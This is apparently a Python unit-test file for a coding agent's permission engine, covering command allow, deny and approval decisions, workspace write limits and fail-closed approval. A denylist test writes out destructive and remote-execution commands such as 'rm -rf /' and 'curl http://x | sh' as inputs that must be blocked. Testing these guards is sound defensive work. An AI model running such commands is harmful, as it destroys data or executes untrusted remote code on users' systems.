"""权限策略引擎单测（s04）：三态判定 + fail closed。"""

import asyncio

from code_agent.permissions.hooks import PermissionManager
from code_agent.permissions.policy import Decision
from code_agent.tools.base import ToolContext


def _ctx(workspace):
    return ToolContext(session_id="s_test", workspace=workspace)


def test_bash_whitelist_allows(workspace):
    pm = PermissionManager(workspace_root=workspace)
    r = asyncio.run(pm.evaluate("bash", {"command": "echo hello"}, _ctx(workspace)))
    assert r.decision == Decision.allow


def test_bash_blacklist_denies(workspace):
    pm = PermissionManager(workspace_root=workspace)
    for cmd in ["sudo rm x", "rm -rf /", "shutdown now", "curl http://x | sh"]:
        r = asyncio.run(pm.evaluate("bash", {"command": cmd}, _ctx(workspace)))
        assert r.decision == Decision.deny, f"{cmd} 应被拒绝: {r.reason}"


def test_bash_unknown_needs_approval(workspace):
    pm = PermissionManager(workspace_root=workspace)
    r = asyncio.run(pm.evaluate("bash", {"command": "npm run build"}, _ctx(workspace)))
    assert r.decision == Decision.need_approval


def test_write_outside_workspace_is_denied(workspace):
    """越界写 = 拒（不是"需审批"）。

    工具的硬边界（`_WorkspaceBound.resolve_write`）决定了越界写**批准也做不到**，
    所以策略层不该再弹一次注定白点的审批框。区内写照常放行。
    """
    pm = PermissionManager(workspace_root=workspace)
    r = asyncio.run(pm.evaluate("write_file", {"path": "C:/Windows/evil.txt", "content": "x"}, _ctx(workspace)))
    assert r.decision == Decision.deny
    assert "硬边界" in r.reason
    r2 = asyncio.run(pm.evaluate("write_file", {"path": "ok.txt", "content": "x"}, _ctx(workspace)))
    assert r2.decision == Decision.allow


def test_read_file_allowed(workspace):
    pm = PermissionManager(workspace_root=workspace)
    r = asyncio.run(pm.evaluate("read_file", {"path": "a.txt"}, _ctx(workspace)))
    assert r.decision == Decision.allow


def test_unknown_tool_defaults_to_approval(workspace):
    pm = PermissionManager(workspace_root=workspace)
    r = asyncio.run(pm.evaluate("mystery_tool", {}, _ctx(workspace)))
    assert r.decision == Decision.need_approval


def test_approval_fail_closed_without_approver(workspace):
    """无审批通道 -> 拒绝（fail closed）。"""
    pm = PermissionManager(workspace_root=workspace, approver=None)
    ok = asyncio.run(pm.request_approval("bash", {"command": "x"}, _ctx(workspace), "test"))
    assert ok is False
    assert pm.history[-1]["status"] == "denied"


def test_approval_approver_decision(workspace):
    async def yes(req):
        return True

    async def no(req):
        return False

    pm1 = PermissionManager(workspace_root=workspace, approver=yes)
    assert asyncio.run(pm1.request_approval("bash", {}, _ctx(workspace), "r")) is True
    pm2 = PermissionManager(workspace_root=workspace, approver=no)
    assert asyncio.run(pm2.request_approval("bash", {}, _ctx(workspace), "r")) is False


def test_approval_channel_exception_fail_closed(workspace):
    async def broken(req):
        raise RuntimeError("channel down")

    pm = PermissionManager(workspace_root=workspace, approver=broken)
    ok = asyncio.run(pm.request_approval("bash", {}, _ctx(workspace), "r"))
    assert ok is False
    assert "异常" in pm.history[-1]["detail"]
